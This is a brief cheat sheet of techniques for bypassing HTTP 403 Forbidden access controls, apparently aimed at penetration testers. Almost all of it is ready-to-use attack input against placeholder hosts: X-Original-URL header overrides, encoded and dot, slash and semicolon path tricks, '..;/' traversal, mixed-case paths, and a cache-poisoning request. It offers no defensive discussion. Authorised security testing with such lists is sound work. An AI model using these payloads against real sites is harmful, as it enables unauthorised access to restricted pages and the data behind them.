# HTTP Code 403 (Forbidden) Bypass

### 1) X-Original-URL header

    GET /admin HTTP/1.1
    Host: target.com
    X-Original-URL: /admin

### 2) Appending %2e after the first slash

    http://target.com/%2e/admin

### 3) Dot (.) slash (/) and semicolon (;) in the URL

    http://target.com/secret/.
    http://target.com/secret//
    http://target.com/secret/..
    http://target.com/;/secret/
    http://target.com/.;/secret/
    http://target.com//;//secret/

### 4) Add "..;/" after the directory name

    http://target.com/admin..;/

### 5) Uppercase alphabet in the URL

    http://target.com/aDmIN

### 6) Web Cache Poisoning

    GET /anything HTTP/1.1
    Host: victim.com
    X-Original-URL: /admin
